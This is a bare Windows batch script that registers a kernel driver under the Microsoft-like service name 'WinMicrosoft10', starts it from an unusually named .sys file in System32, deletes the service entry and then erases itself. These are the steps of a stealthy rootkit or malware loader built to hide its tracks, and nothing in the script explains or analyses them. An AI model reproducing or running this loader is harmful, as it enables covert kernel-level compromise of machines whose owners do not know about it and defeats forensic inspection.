@echo off
cd %~dp0
sc create WinMicrosoft10 binpath=C:\Windows\System32\Bta10MPM.sys type=kernel
sc start WinMicrosoft10
sc delete WinMicrosoft10
del "%~f0"